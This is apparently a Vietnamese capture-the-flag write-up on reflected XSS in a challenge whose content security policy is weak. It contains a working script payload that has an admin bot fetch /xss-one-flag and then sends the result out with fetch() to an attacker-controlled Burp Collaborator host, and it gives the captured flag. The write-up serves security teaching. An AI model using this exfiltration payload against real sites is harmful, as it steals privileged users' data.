#  KHAI THÁC LỖ HỔNG XSS ĐÁNH CẮP FLAG (DATA EXFILTRATION)

##  I. Thu thập thông tin & Phân tích (Recon & Analysis)

Quá trình khai thác bắt đầu bằng việc phân tích kỹ lưỡng các gợi ý (Hints) từ hệ thống:

**1. Phân tích CSP (Content Security Policy)**
Đề bài cung cấp Header CSP hiện tại của trang web:
```http
Content-Security-Policy: script-src 'self' 'unsafe-inline'; connect-src *;
```
> **Suy luận:** CSP chính là lớp lá chắn của trình duyệt. Việc cấu hình `'unsafe-inline'` ở `script-src` là một sai lầm chí mạng, xác nhận rằng ứng dụng cho phép thực thi mã JavaScript trực tiếp thông qua thẻ `<script>`. Hơn nữa, `connect-src *` cho phép mã JavaScript của ta gửi HTTP request (tuồn dữ liệu) ra bất kỳ domain nào bên ngoài (như Burp Collaborator hay RequestBin).

**2. Kiểm chứng lỗ hổng (Verification)**
Đề bài gợi ý thử nghiệm payload cơ bản:
```html
<script>alert(1);</script>
```
> **Suy luận:** Bước này để xác nhận lỗ hổng XSS thực sự tồn tại. Nếu trang web không filter (lọc) các ký tự đặc biệt như `<`, `>`, `script`, ta hoàn toàn có thể chèn mã độc thực thụ vào. 

**3. Lên chiến thuật tấn công (Attack Strategy)**
Đề bài gợi ý dùng `XMLHttpRequest` (hoặc `fetch`) và một quy trình khai thác gồm 2 bước.
> **Suy luận:** Các API như `XMLHttpRequest` hay `fetch` giúp mã JavaScript giao tiếp với máy chủ (server) ở chế độ nền mà không cần tải lại trang. Khi thử nghiệm payload `<script>alert(1);</script>`, màn hình lập tức popup thông báo `1`. Từ đó, ta có thể xác nhận điểm entry này dính lỗi **XSS Reflected**.

![image](https://github.com/user-attachments/assets/1b8c1a05-f12f-4cc4-aa2d-a0ffec2c9de9)

![image](https://github.com/user-attachments/assets/e853395b-fe4a-4e3e-ae14-d3c018403992)

---

##  II. Tiến hành Khai thác (Exploit & Exfiltration)

Khi đã xác nhận được lỗ hổng XSS, ta chú ý đến một thông báo cực kỳ quan trọng từ tác giả: 
> *"Every payload submitted here is forwarded to the admin reviewer. Send a JavaScript payload that will fetch the flag, and send it to a request bin or server you control."*

**Kịch bản tấn công:** Bất kỳ payload nào gửi lên đều sẽ được một Admin Bot (Reviewer) kiểm tra. Ta sẽ lợi dụng quyền (Session/Cookies) của Admin Bot này để đọc file chứa Flag ở endpoint `/xss-one-flag`, sau đó "tuồn" (exfiltrate) dữ liệu đó ra ngoài máy chủ của kẻ tấn công.

**Chế tạo Payload độc hại:**
Ta viết một đoạn mã JavaScript thực hiện 2 hành động liên tiếp (Quy trình 2 bước):
1. Gửi request GET đến `/xss-one-flag` để lấy nội dung flag dưới quyền của Admin.
2. Nối chuỗi flag lấy được vào URL của Burp Collaborator và gửi request ra ngoài.

```html
<script>
  // Bước 1: Đọc nội dung flag từ endpoint nội bộ
  fetch('/xss-one-flag')
    .then(response => response.text())
    .then(data => {
        // Bước 2: Tuồn dữ liệu ra máy chủ do attacker kiểm soát (Burp Collaborator)
        let exfilUrl = '[https://gl5wliclr8yyax0z7pwct8oay14ssjg8.oastify.com/?flag=](https://gl5wliclr8yyax0z7pwct8oay14ssjg8.oastify.com/?flag=)' + encodeURIComponent(data);
        fetch(exfilUrl);
    });
</script>
```

**Kết quả (The Impact):**
Sau khi submit payload, ta mở công cụ **Burp Collaborator** (hoặc webhook tương đương) để theo dõi các luồng request gọi về máy chủ của mình. 

![image](https://github.com/user-attachments/assets/4be8db6b-5ed8-40f7-9923-444e72e69ac1)

 Khai thác thành công! Máy chủ đã ghi nhận một request HTTP chứa chuỗi query parameter kèm theo Flag.

** FLAG THU ĐƯỢC:**
```text
CTF{X55-tut0r1al-1s-back}
```
